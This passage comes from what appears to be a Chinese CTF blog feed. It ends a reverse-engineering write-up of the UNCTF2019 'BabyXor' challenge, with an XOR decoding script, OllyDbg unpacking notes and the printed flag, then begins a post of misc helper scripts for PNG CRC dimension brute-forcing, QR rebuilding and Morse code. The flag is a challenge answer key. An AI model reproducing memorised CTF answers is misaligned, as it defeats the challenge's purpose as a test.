number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>dword_435DF8 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>dword_435E30 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>由于数据是小端序存放，每组中间间隔的 “0x00, 0x00, 0x00” 是高位<br>即：内存中 <code>&quot;0x1A, 0x00, 0x00, 0x00&quot;</code> 代表 <code>&quot;0x0000001A&quot;</code><br>根据 <code>a2 &gt;&gt; 2</code> 也可知，<code>56 &gt;&gt; 2 = 14</code>，每 4 个十六进制一组，共 56 &#x2F; 4 &#x3D; 14 组<br>所以导出的数据其实可以简化如下：（<em>可以在 Pycharm 中使用 Ctrl + F 进行替换快速得到</em>）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">unk_435DC0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">]</span>    dword_435DF8 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">]</span>    dword_435E30 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="11"><li>按照程序逻辑，编写脚本，分别使用三个函数生成三个字符串，然后进行拼接</li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">unk_435DC0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">]</span>  dword_435DF8 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">]</span>  dword_435E30 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">]</span>    v8 <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      v8 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i <span class="token operator">^</span> unk_435DC0<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span>      Src <span class="token operator">=</span> <span class="token string">""</span>  Src <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>dword_435DF8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 下面的循环是从第二个元素开始，不要忘了还有个没改变的第一个值  </span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      Src <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>unk_435DC0<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> dword_435DF8<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> unk_435DC0<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>Src<span class="token punctuation">)</span>      Source <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      Source <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>k <span class="token operator">^</span> dword_435E30<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>Src<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  Destination <span class="token operator">=</span> <span class="token string">""</span>  Destination <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>dword_435DF8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> dword_435E30<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  v5 <span class="token operator">=</span> Destination <span class="token operator">+</span> Source  <span class="token keyword">print</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span>      flag <span class="token operator">=</span> v8 <span class="token operator">+</span> Src <span class="token operator">+</span> v5  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>由于发现 flag 与程序输入无关，是由程序内部的数据运算得到的<br>并且 <code>sub_40101E(v8, Src, v5)</code> 函数中直接拼接得到了 flag<br>所以 flag 一定会出现在程序中<br>于是可以通过调试来观察 flag</p></li><li><p>用 OllyDBG 打开<br>定位到最后拼接 flag 的 <code>sub_40101E(v8, Src, v5)</code> 函数处<br>根据 <code>call    sub_40101E</code> 的地址 <code>0x00401712</code> 处下断点<br>直接运行看堆栈数据就能得出 flag</p></li></ol><blockquote><p><del>但是前面我脱壳之后的程序只能在 IDA 中正常分析，却无法双击运行</del></p><p>原因找到了，在 <code>右键 --&gt; 用 OllyDump脱壳调试进程</code> 进行脱壳的时候<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor29.png" alt="攻防世界_BabyXor29.png"><br>左下角有两种方式<br>我前面是选择的 <code>方式 1</code>，虽然成功脱壳了，可以 IDA 静态分析，但是却无法运行程序<br>现在选了 <code>方式 2</code> 试了一下，发现既可以 IDA 静态分析，也可以运行程序了<br>（<mark>脱壳的时候最好两种方式都试一试</mark>）</p></blockquote><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{2378b077-7d6e-4564-bdca-7eec8eede9a2}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor28.png" alt="攻防世界_BabyXor28.png"></p>]]></content>
    
    
    <summary type="html">攻防世界一道逆向，UNCTF2019 的一道题，主要考察 OllyDBG 手动脱壳，这里用到的是 ESP 脱壳定律，记录一下第一次手动调试脱壳的经历</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>杂项中的脚本</title>
    <link href="https://www.4ss1du0us.cn/2023/0560e8d6d2.html"/>
    <id>https://www.4ss1du0us.cn/2023/0560e8d6d2.html</id>
    <published>2023-05-09T08:11:01.000Z</published>
    <updated>2023-05-14T00:29:10.981Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CRC-爆破图片宽高"><a href="#CRC-爆破图片宽高" class="headerlink" title="CRC 爆破图片宽高"></a>CRC 爆破图片宽高</h2><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E9%9A%90%E5%86%991.png" alt="隐写1.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct  <span class="token keyword">import</span> zlib    <span class="token comment"># --------------- 需要修改的参数 ---------------</span><span class="token comment"># (直接从WinHex中以十六进制数值复制选块)</span>str1 <span class="token operator">=</span> <span class="token string">"49484452"</span>  <span class="token comment"># IHDR  </span>width <span class="token operator">=</span> <span class="token string">"01DA"</span>  <span class="token comment"># 图片宽度  </span>height <span class="token operator">=</span> <span class="token string">"00EF"</span>  <span class="token comment"># 图片高度  </span>str2 <span class="token operator">=</span> <span class="token string">"0806000000"</span>  <span class="token comment"># 图片高度height~CRC之间的5个字节  </span>crc32 <span class="token operator">=</span> <span class="token string">"52084BFB"</span>  <span class="token comment"># CRC  </span>add_num <span class="token operator">=</span> <span class="token number">2000</span>  <span class="token comment"># 最大宽高，合理修改快速出flag (一般可不修改)  </span><span class="token comment"># -------------------------------------------  </span>    <span class="token keyword">def</span> <span class="token function">hexStr2bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>      b <span class="token operator">=</span> <span class="token string">b""</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          temp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span>          b <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> b      check <span class="token operator">=</span> <span class="token number">0</span>  bytes1 <span class="token operator">=</span> hexStr2bytes<span class="token punctuation">(</span>str1<span class="token punctuation">)</span>  bytes2 <span class="token operator">=</span> hexStr2bytes<span class="token punctuation">(</span>str2<span class="token punctuation">)</span>  crc <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>crc32<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  wid <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  hei <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>height<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>wid<span class="token punctuation">,</span> wid <span class="token operator">+</span> add_num<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">for</span> h <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>hei<span class="token punctuation">,</span> hei <span class="token operator">+</span> add_num<span class="token punctuation">)</span><span class="token punctuation">:</span>          width <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>          height <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>          bytes_temp <span class="token operator">=</span> hexStr2bytes<span class="token punctuation">(</span>width <span class="token operator">+</span> height<span class="token punctuation">)</span>          <span class="token keyword">if</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>zlib<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>bytes1 <span class="token operator">+</span> bytes_temp <span class="token operator">+</span> bytes2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"爆破成功!"</span><span class="token punctuation">)</span>              <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正确的宽高:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">)</span>              check <span class="token operator">=</span> <span class="token number">1</span>              <span class="token keyword">break</span>  <span class="token keyword">if</span> check <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"爆破失败！"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="01序列转二维码"><a href="#01序列转二维码" class="headerlink" title="01序列转二维码"></a>01序列转二维码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image    key <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment"># 二维码01序列  </span>MAX <span class="token operator">=</span> <span class="token number">25</span>  <span class="token comment"># 二维码的长宽  </span>pic <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>MAX<span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">)</span>  white <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>  black <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  i <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">if</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>              pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span><span class="token punctuation">,</span> black<span class="token punctuation">)</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span><span class="token punctuation">,</span> white<span class="token punctuation">)</span>          i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>  pic<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="摩斯密码加解密"><a href="#摩斯密码加解密" class="headerlink" title="摩斯密码加解密"></a>摩斯密码加解密</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">MORSE_CODE_DICT <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token string">'.-'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">:</span> <span class="token string">'-...'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">:</span> <span class="token string">'-.-.'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">:</span> <span class="token string">'-..'</span><span class="token punctuation">,</span>                     <span class="token string">'E'</span><span class="token punctuation">:</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">:</span> <span class="token string">'..-.'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">:</span> <span class="token string">'--.'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">:</span> <span class="token string">'....'</span><span class="token punctuation">,</span>                     <span class="token string">'I'</span><span class="token punctuation">:</span> <span class="token string">'..'</span><span class="token punctuation">,</span> <span class="token string">'J'</span><span class="token punctuation">:</span> <span class="token string">'.---'</span><span class="token punctuation">,</span> <span class="token string">'K'</span><span class="token punctuation">:</span> <span class="token string">'-.-'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">:</span> <span class="token string">'.-..'</span><span class="token punctuation">,</span>                     <span class="token string">'M'</span><span class="token punctuation">:</span> <span class="token string">'--'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">:</span> <span class="token string">'-.'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">:</span> <span class="token string">'---'</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">:</span> <span class="token string">'.--.'</span><span class="token punctuation">,</span>                     <span class="token string">'Q'</span><span class="token punctuation">:</span> <span class="token string">'--.-'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">:</span> <span class="token string">'.-.'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">:</span> <span class="token string">'...'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">:</span> <span class="token string">'-'</span><span class="token punctuation">,</span>                     <span class="token string">'U'</span><span class="token punctuation">:</span> <span class="token string">'..-'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">:</span> <span class="token string">'...-'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">:</span> <span class="token string">'.--'</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">:</span> <span class="token string">'-..-'</span><span class="token punctuation">,</span>                     <span class="token string">'Y'</span><span class="token punctuation">:</span> <span class="token string">'-.--'</span><span class="token punctuation">,</span> <span class="token string">'Z'</span><span class="token punctuation">:</span> <span class="token string">'--..'</span><span class="token punctuation">,</span>                     